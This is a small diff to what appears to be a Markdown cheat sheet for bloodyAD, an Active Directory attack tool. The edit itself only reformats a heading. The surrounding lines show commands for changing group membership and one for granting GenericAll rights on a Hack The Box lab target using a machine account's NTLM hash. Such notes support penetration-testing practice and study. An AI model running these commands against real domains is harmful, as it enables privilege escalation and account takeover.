@@ -23,8 +23,7 @@ bloodyAD -d domain.local --host x.x.x.x -u username -p password add groupMember 
 ```bash
 bloodyAD -d haze.htb --host 10.129.232.50 -u 'haze-IT-backup$' -p :4de830d1d58c14e241aff55f82ecdba1 add genericAll 'SUPPORT_SERVICES' 'haze-IT-backup$'
 ```
-
-Remove from group
+#### Remove from group
 
 ```bash
 bloodyAD -d domain.local --host x.x.x.x -u username -p password remove groupMember 'target_group' 'group_to_remove'
